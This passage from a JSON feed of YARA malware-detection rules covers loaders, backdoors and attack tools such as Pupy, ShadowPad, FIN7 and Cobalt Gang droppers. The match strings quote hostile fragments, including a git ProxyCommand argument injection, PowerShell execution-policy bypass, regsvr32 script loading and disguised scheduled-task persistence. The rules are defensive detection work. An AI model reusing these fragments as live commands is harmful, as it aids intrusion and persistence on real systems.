\"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\inject.pdb\" fullword ascii\n      $s2 = \"!!! Failed to gather information on system processes! \" fullword ascii\n      $s3 = \"reflective_dll.dll\" fullword ascii\n      $s4 = \"[-] %s. Error=%d\" fullword ascii\n      $s5 = \"\\\\Start Menu\\\\Programs\\\\reflective_dll.dll\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"26ba48d3e3b964f75ff148b6679b42ec\" or 2 of them ) ) or ( 3 of them )\n}","date":"2017-08-20 13:25:21","description":"Detects Reflective DLL Loader","minimum_yara":"1.7","name":"Reflective_DLL_Loader_Aug17_3_RID3181","reference":"Internal Research","required_modules":["pe"],"rule_hash":"b2404b2c04b0abb6f06cec0151340b78","score":75,"tags":["T1055","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Reflective_DLL_Loader_Aug17_4_RID3182 : DEMO EXE FILE HKTL T1055 {\n   meta:\n      description = \"Detects Reflective DLL Loader\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-20 13:25:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1055\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<H1>&nbsp;>> >> >> Keylogger Installed - %s %s << << <<</H1>\" fullword ascii\n      $s1 = \"<H3> ----- Running Process ----- </H3>\" fullword ascii\n      $s2 = \"<H2>Operating system: %s<H2>\" fullword ascii\n      $s3 = \"<H2>System32 dir:  %s</H2>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )\n}","date":"2017-08-20 13:25:31","description":"Detects Reflective DLL Loader","minimum_yara":"1.7","name":"Reflective_DLL_Loader_Aug17_4_RID3182","reference":"Internal Research","required_modules":[],"rule_hash":"2eb359adff2ca6ac13d54d042e1da906","score":75,"tags":["T1055","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ShadowPad_nssock2_RID2DAE : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malicious nssock2.dll from ShadowPad incident - file nssock2.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/shadowpad-in-corporate-networks/81432/\"\n      date = \"2017-08-15 10:42:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"c67de089f2009b21715744762fc484e8\" or pe.imphash ( ) == \"11522f7d4b2fc05acba8f534ca1b828a\" ) )\n}","date":"2017-08-15 10:42:11","description":"Detects malicious nssock2.dll from ShadowPad incident - file nssock2.dll","minimum_yara":"1.7","name":"ShadowPad_nssock2_RID2DAE","reference":"https://securelist.com/shadowpad-in-corporate-networks/81432/","required_modules":["pe"],"rule_hash":"9a3d68a3ade02d3e00b5738f61c8e297","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Pupy_Backdoor_RID2C43 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Pupy backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/n1nj4sec/pupy-binaries\"\n      date = \"2017-08-11 09:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"reflectively inject a dll into a process.\" fullword ascii\n      $x2 = \"ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid\" fullword ascii\n      $x3 = \"LD_PRELOAD=%s HOOK_EXIT=%d CLEANUP=%d exec %s 1>/dev/null 2>/dev/null\" fullword ascii\n      $x4 = \"reflective_inject_dll\" fullword ascii\n      $x5 = \"ld_preload_inject_dll\" fullword ascii\n      $x6 = \"get_pupy_config() -> string\" fullword ascii\n      $x7 = \"[INJECT] inject_dll. OpenProcess failed.\" fullword ascii\n      $x8 = \"reflective_inject_dll\" fullword ascii\n      $x9 = \"reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\" fullword ascii\n      $x10 = \"linux_inject_main\" fullword ascii\n   condition: \n      ( ( uint16 ( 0 ) == 0x457f or uint16 ( 0 ) == 0x5a4d ) and filesize < 7000KB and 1 of them ) or 3 of them or ( uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == \"84a69bce2ff6d9f866b7ae63bd70b163\" )\n}","date":"2017-08-11 09:41:41","description":"Detects Pupy backdoor","minimum_yara":"1.7","name":"Pupy_Backdoor_RID2C43","reference":"https://github.com/n1nj4sec/pupy-binaries","required_modules":["pe"],"rule_hash":"bab0f20bacc6d524ab474b9d34edea3a","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule git_CVE_2017_9800_poc_RID2D8C : DEMO EXPLOIT SUSP {\n   meta:\n      description = \"Detects a CVE-2017-9800 exploitation attempt\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/mzbat/status/895811803325898753\"\n      date = \"2017-08-11 10:36:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"git clone ssh://-oProxyCommand=\" ascii\n      $s2 = \"git clone http://-\" ascii\n      $s3 = \"git clone https://-\" ascii\n   condition: \n      filesize < 200KB and 1 of them\n}","date":"2017-08-11 10:36:31","description":"Detects a CVE-2017-9800 exploitation attempt","minimum_yara":"1.7","name":"git_CVE_2017_9800_poc_RID2D8C","reference":"https://twitter.com/mzbat/status/895811803325898753","required_modules":[],"rule_hash":"9e52cf2e6b8dddd8133901810abcf9d0","score":60,"tags":["SUSP","DEMO","EXPLOIT"]},{"author":"Florian Roth","content":"rule CobaltStrike_CN_Group_BeaconDropper_Aug17_RID369B : DEMO MAL T1075 T1117 {\n   meta:\n      description = \"Detects Script Dropper of Cobalt Gang used in August 2017\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-09 17:03:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1075, T1117\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"WriteLine(\\\"(new ActiveXObject('WScript.Shell')).Run('cmd /c c:/\" ascii\n      $x2 = \"WriteLine(\\\" (new ActiveXObject('WScript.Shell')).Run('regsvr32 /s\" ascii\n      $x3 = \"sh.Run(env('cmd /c set > %temp%\" ascii\n      $x4 = \"sh.Run('regsvr32 /s /u /i:\" ascii\n      $x5 = \".Get('Win32_ScheduledJob').Create('regsvr32 /s /u /i:\" ascii\n      $x6 = \"scrobj.dll','********\" ascii\n      $x7 = \"www.thyssenkrupp-marinesystems.org\" fullword ascii\n      $x8 = \"f.WriteLine(\\\" tLnk=env('%tmp%/'+lnkName+'.lnk');\\\");\" fullword ascii\n      $x9 = \"lnkName='office 365'; \" fullword ascii\n      $x10 = \";sh=x('WScript.Shell');\" ascii\n   condition: \n      ( filesize < 200KB and 1 of them )\n}","date":"2017-08-09 17:03:01","description":"Detects Script Dropper of Cobalt Gang used in August 2017","minimum_yara":"1.7","name":"CobaltStrike_CN_Group_BeaconDropper_Aug17_RID369B","reference":"Internal Research","required_modules":[],"rule_hash":"4b85986fe24cde65221cff42ad3f7694","score":75,"tags":["T1075","DEMO","T1117","MAL"]},{"author":"Florian Roth","content":"rule CobaltGang_Malware_Aug17_1_RID307F : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a Cobalt Gang malware\"\n      author = \"Florian Roth\"\n      reference = \"https://sslbl.abuse.ch/intel/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c\"\n      date = \"2017-08-09 12:42:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ServerSocket.EXE\" fullword wide\n      $s2 = \"Incorrect version of WS2_32.dll found\" fullword ascii\n      $s3 = \"Click 'Connect' to Connect to the Server.  'Disconnect' to disconnect from server.\" fullword wide\n      $s4 = \"Click 'Start' to start the Server.  'Stop' to Stop it.\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )\n}","date":"2017-08-09 12:42:21","description":"Detects a Cobalt Gang malware","minimum_yara":"1.7","name":"CobaltGang_Malware_Aug17_1_RID307F","reference":"https://sslbl.abuse.ch/intel/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c","required_modules":[],"rule_hash":"b2b8fe82b87faa1d62c290ca18422c8a","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CobaltGang_Malware_Aug17_2_RID3080 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a Cobalt Gang malware\"\n      author = \"Florian Roth\"\n      reference = \"https://sslbl.abuse.ch/intel/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c\"\n      date = \"2017-08-09 12:42:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; BOIE9;ENGB)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}","date":"2017-08-09 12:42:31","description":"Detects a Cobalt Gang malware","minimum_yara":"1.7","name":"CobaltGang_Malware_Aug17_2_RID3080","reference":"https://sslbl.abuse.ch/intel/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c","required_modules":[],"rule_hash":"d36380a856a0ab9616fec8184cc90c66","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Agent_BTZ_Proxy_DLL_1_RID2E9B : DEMO EXE FILE HKTL MAL T1090 {\n   meta:\n      description = \"Detects Agent-BTZ Proxy DLL - activeds.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://www.intezer.com/new-variants-of-agent-btz-comrat-found/\"\n      date = \"2017-08-07 11:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, MAL, T1090\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Modules\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them and pe.exports ( \"Entry\" ) )\n}","date":"2017-08-07 11:21:41","description":"Detects Agent-BTZ Proxy DLL - activeds.dll","minimum_yara":"1.7","name":"Agent_BTZ_Proxy_DLL_1_RID2E9B","reference":"http://www.intezer.com/new-variants-of-agent-btz-comrat-found/","required_modules":["pe"],"rule_hash":"ad36e572a62c1642d912690452103068","score":75,"tags":["T1090","MAL","DEMO","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule Agent_BTZ_Aug17_RID2C33 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Agent.BTZ\"\n      author = \"Florian Roth\"\n      reference = \"http://www.intezer.com/new-variants-of-agent-btz-comrat-found/\"\n      date = \"2017-08-07 09:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"stdole2.tlb\" fullword ascii\n      $s2 = \"UnInstallW\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them and pe.exports ( \"Entry\" ) and pe.exports ( \"InstallW\" ) and pe.exports ( \"UnInstallW\" ) )\n}","date":"2017-08-07 09:39:01","description":"Detects Agent.BTZ","minimum_yara":"1.7","name":"Agent_BTZ_Aug17_RID2C33","reference":"http://www.intezer.com/new-variants-of-agent-btz-comrat-found/","required_modules":["pe"],"rule_hash":"9db09505061381f676cbb90f6bdfcdb7","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Zeus_Panda_RID2AFB : CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ZEUS Panda Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://cyberwtf.files.wordpress.com/2017/07/panda-whitepaper.pdf\"\n      date = \"2017-08-04 08:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SER32.dll\" fullword ascii\n      $x2 = \"/c start \\\"\\\" \\\"%s\\\"\" fullword wide\n      $x3 = \"del /F \\\"%s\\\"\" fullword ascii\n      $s1 = \"bcdfghklmnpqrstvwxz\" fullword ascii\n      $s2 = \"=> -,0;\" fullword ascii\n      $s3 = \"Yahoo! Slurp\" fullword ascii\n      $s4 = \"ZTNHGET ^&\" fullword ascii\n      $s5 = \"MSIE 9\" fullword ascii\n      $s6 = \"%s%08x.%s\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 2 of ( $x* ) or 4 of them )\n}","date":"2017-08-04 08:47:01","description":"Detects ZEUS Panda Malware","minimum_yara":"1.7","name":"Zeus_Panda_RID2AFB","reference":"https://cyberwtf.files.wordpress.com/2017/07/panda-whitepaper.pdf","required_modules":[],"rule_hash":"c997e355f805a1b7482632128a590f91","score":75,"tags":["DEMO","EXE","CHINA","FILE","MAL"]},{"author":"Florian Roth","content":"rule FIN7_Dropper_Aug17_RID2D44 : DEMO FILE MAL OFFICE RUSSIA {\n   meta:\n      description = \"Detects Word Dropper from Proofpoint FIN7 Report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor\"\n      date = \"2017-08-04 10:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, OFFICE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"tpircsj:e/ b// exe.tpircsw\\\" rt/\" fullword ascii\n      $s1 = \"Scripting.FileSystemObject$\" fullword ascii\n      $s2 = \"PROJECT.THISDOCUMENT.AUTOOPEN\" fullword wide\n      $s3 = \"Project.ThisDocument.AutoOpen\" fullword wide\n      $s4 = \"\\\\system3\" fullword ascii\n      $s5 = \"ShellV\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 700KB and 1 of ( $x* ) or all of ( $s* ) )\n}","date":"2017-08-04 10:24:31","description":"Detects Word Dropper from Proofpoint FIN7 Report","minimum_yara":"1.7","name":"FIN7_Dropper_Aug17_RID2D44","reference":"https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor","required_modules":[],"rule_hash":"83a4f7075ee7380a1fee40157a6e8e20","score":75,"tags":["DEMO","OFFICE","RUSSIA","FILE","MAL"]},{"author":"Florian Roth","content":"rule FIN7_Backdoor_Aug17_RID2D8D : DEMO EXE FILE MAL OFFICE RUSSIA T1053 {\n   meta:\n      description = \"Detects Word Dropper from Proofpoint FIN7 Report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor\"\n      date = \"2017-08-04 10:36:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, OFFICE, RUSSIA, T1053\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"wscript.exe //b /e:jscript C:\\\\Users\\\\\" ascii\n      $x2 = \"wscript.exe /b /e:jscript C:\\\\Users\\\\\" ascii\n      $x3 = \"schtasks /Create /f /tn \\\"GoogleUpdateTaskMachineSystem\\\" /tr \\\"wscript.exe\" ascii nocase\n      $x4 = \"schtasks /Delete /F /TN \\\"\\\"GoogleUpdateTaskMachineCore\" ascii nocase\n      $x5 = \"schtasks /Delete /F /TN \\\"GoogleUpdateTaskMachineCore\" ascii nocase\n      $x6 = \"wscript.exe //b /e:jscript %TMP%\\\\debug.txt\" ascii\n      $s1 = \"/?page=wait\" fullword ascii\n      $a1 = \"autoit3.exe\" fullword ascii\n      $a2 = \"dumpcap.exe\" fullword ascii\n      $a3 = \"tshark.exe\" fullword ascii\n      $a4 = \"prl_cc.exe\" fullword ascii\n      $v1 = \"vmware\" fullword ascii\n      $v2 = \"PCI\\\\\\\\VEN_80EE&DEV_CAFE\" fullword ascii\n      $v3 = \"VMWVMCIHOSTDEV\" fullword ascii\n      $c1 = \"apowershell\" fullword ascii\n      $c2 = \"wpowershell\" fullword ascii\n      $c3 = \"get_passwords\" fullword ascii\n      $c4 = \"kill_process\" fullword ascii\n      $c5 = \"get_screen\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( 1 of ( $x* ) or all of ( $a* ) or all of ( $v* ) or 3 of ( $c* ) ) ) or 5 of them\n}","date":"2017-08-04 10:36:41","description":"Detects Word Dropper from Proofpoint FIN7 Report","minimum_yara":"1.7","name":"FIN7_Backdoor_Aug17_RID2D8D","reference":"https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor","required_modules":[],"rule_hash":"4b2fa16e5bc451e352ad5fefa8110582","score":75,"tags":["OFFICE","MAL","DEMO","T1053","FILE","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule Impacket_Keyword_RID2D83 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Impacket Keyword in Executable\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-04 10:35:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.smb(\" fullword ascii\n      $s2 = \"impacket.ntlm(\" fullword ascii\n      $s3 = \"impacket.nmb(\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 14000KB and 1 of them )\n}","date":"2017-08-04 10:35:01","description":"Detects Impacket Keyword in Executable","minimum_yara":"1.7","name":"Impacket_Keyword_RID2D83","reference":"Internal Research","required_modules":[],"rule_hash":"4cba52d46a6c9b618a814217084659cc","score":60,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule PowerShdll_RID2B15 : DEMO HKTL T1085 {\n   meta:\n      description = \"Semiautomatic generated rule - from files PowerShdll_RID2B15.dll, PowerShdll_RID2B15.dll\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-03 08:51:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"rundll32 PowerShdll_RID2B15,main -f <path>\" fullword wide\n      $x2 = \"\\\\PowerShdll_RID2B15.dll\" fullword ascii\n      $x3 = \"rundll32 PowerShdll_RID2B15,main <script>\" fullword wide\n   condition: \n      1 of them\n}","date":"2017-08-03 08:51:21","description":"Semiautomatic generated rule - from files PowerShdll.dll, PowerShdll.dll","minimum_yara":"1.7","name":"PowerShdll_RID2B15","reference":"Internal Research","required_modules":[],"rule_hash":"5123079ea0d28aa987071c708c4e1140","score":75,"tags":["DEMO","T1085","HKTL"]},{"author":"Florian Roth","content":"rule Foudre_Backdoor_1_RID2D8A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Foudre Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Nbqbt6\"\n      date = \"2017-08-01 10:36:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"initialization failed: Reinstall the program\" fullword wide\n      $s2 = \"SnailDriver V1\" fullword wide\n      $s3 = \"lp.ini\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them )\n}","date":"2017-08-01 10:36:11","description":"Detects Foudre Backdoor","minimum_yara":"1.7","name":"Foudre_Backdoor_1_RID2D8A","reference":"https://goo.gl/Nbqbt6","required_modules":[],"rule_hash":"8caef6efbd53375b27a7f2e7005f668a","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Foudre_Backdoor_SFX_RID2E4A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Foudre Backdoor SFX\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Nbqbt6\"\n      date = \"2017-08-01 11:08:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"main.exe\" fullword ascii\n      $s2 = \"pub.key\" fullword ascii\n      $s3 = \"WinRAR self-extracting archive\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-08-01 11:08:11","description":"Detects Foudre Backdoor SFX","minimum_yara":"1.7","name":"Foudre_Backdoor_SFX_RID2E4A","reference":"https://goo.gl/Nbqbt6","required_modules":[],"rule_hash":"10c88ffe2c44252876d2df08cbf20223","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule IsmDoor_Jul17_A2_RID2C92 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects IsmDoor Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/Voulnet/status/892104753295110145\"\n      date = \"2017-08-01 09:54:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell -exec bypass -file \\\"\" fullword ascii\n      $s2 = \"PAQlFcaWUaFkVICEx2CkNCUUpGcA\" ascii\n      $s3 = \"\\\\Documents\" fullword ascii\n      $s4 = \"\\\\Libraries\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )\n}","date":"2017-08-01 09:54:51","description":"Detects IsmDoor Malware","minimum_yara":"1.7","name":"IsmDoor_Jul17_A2_RID2C92","reference":"https://twitter.com/Voulnet/status/892104753295110145","required_modules":[],"rule_hash":"9024aa46fadddce3072104f6013837ac","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Unknown_Malware_Sample_Jul17_2_RID326D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects unknown malware sample with pastebin RAW URL\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/iqH8CK\"\n      date = \"2017-08-01 14:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"4System.Web.Services.Protocols.SoapHttpClientProtocol\" fullword ascii\n      $s2 = \"https://pastebin.com/raw/\" wide\n      $s3 = \"My.Computer\" fullword ascii\n      $s4 = \"MyTemplate\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-08-01 14:04:41","description":"Detects unknown malware sample with pastebin RAW URL","minimum_yara":"1.7","name":"Unknown_Malware_Sample_Jul17_2_RID326D","reference":"https://goo.gl/iqH8CK","required_modules":[],"rule_hash":"6828e5bbbc31415b3953a5d895653ddf","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Foudre_Backdoor_Dropper_1_RID30C5 : DEMO EXE FILE MAL T1060 {\n   meta:\n      description = \"Detects Foudre Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Nbqbt6\"\n      date = \"2017-08-01 12:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1060\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"536F594A96C5496CB3949A4DA4775B576E049C57696E646F77735C43757272656E7456657273696F6E5C5C52756E\" fullword wide\n      $x2 = \"2220263024C380B3278695851482EC32\" fullword wide\n      $s1 = \"C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\\\\\Startup\\\\\" fullword wide\n      $s2 = \"C:\\\\Documents and Settings\\\\All Users\\\\\" fullword wide\n      $s3 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\\\\\Shell Folders\" fullword wide\n      $s4 = \"ShellExecuteW\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 4 of them ) )\n}","date":"2017-08-01 12:54:01","description":"Detects Foudre Backdoor","minimum_yara":"1.7","name":"Foudre_Backdoor_Dropper_1_RID30C5","reference":"https://goo.gl/Nbqbt6","required_modules":[],"rule_hash":"9e9f387a9613c2b1e3c409aca6d2ffb2","score":75,"tags":["DEMO","EXE","T1060","FILE","MAL"]},{"author":"Florian Roth","content":"rule Foudre_Backdoor_Component_1_RID319C : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Foudre Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Nbqbt6\"\n      date = \"2017-08-01 13:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 50 72 6F 6A 65 63 74 31 2E 64 6C 6C 00 44 31 } \n      $s2 = \"winmgmts:\\\\\\\\localhost\\\\root\\\\SecurityCenter2\" fullword wide\n      $s3 = \"C:\\\\Documents and Settings\\\\All Users\\\\\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 3 of them ) or ( 2 of them and pe.exports ( \"D1\" ) ) )\n}","date":"2017-08-01 13:29:51","description":"Detects Foudre Backdoor","minimum_yara":"1.7","name":"Foudre_Backdoor_Component_1_RID319C","reference":"https://goo.gl/Nbqbt6","required_modules":["pe"],"rule_hash":"d66ce32cff518db81eebe31490fc4235","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CACTUSTORCH_RID2A54 : DEMO HKTL T1085 {\n   meta:\n      description = \"Detects CactusTorch Hacktool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/mdsecactivebreach/CACTUSTORCH_RID2A54\"\n      date = \"2017-07-31 05:11:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$payload = shellcode(%options[\\\"listener\\\"], \\\"true\\\", \\\"x86\\\");\" fullword ascii\n      $x2 = \"Copy the base64 encoded payload into the code variable below.\" fullword ascii\n      $x3 = \" CACTUSTORCH_RID2A54 Payload\" ascii\n      $x4 = \"ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)\" fullword ascii\n      $x5 = \"' Author: Vincent Yiu (@vysecurity)\" fullword ascii\n      $x6 = \"Dim binary : binary = \\\"rundll32.exe\\\"\" fullword ascii\n      $a1 = \"code = code & \\\"\" ascii\n      $a2 = \"serialized_obj = serialized_obj & \\\"\" ascii\n      $s1 = \"binary = \\\"rundll32.exe\\\"\" fullword ascii\n      $s2 = \"EL.DataType = \\\"bin.hex\\\"\" fullword ascii\n      $s3 = \"Set stm = CreateObject(\\\"System.IO.MemoryStream\\\")\" fullword ascii\n      $s4 = \"var binary = \\\"rundll32.exe\\\";\" fullword ascii\n      $s5 = \"var serialized_obj = \\\"\" ascii\n   condition: \n      ( filesize < 800KB and ( 1 of ( $x* ) or ( 1 of ( $a* ) and 1 of ( $s* ) ) ) ) or ( 3 of them )\n}","date":"2017-07-31 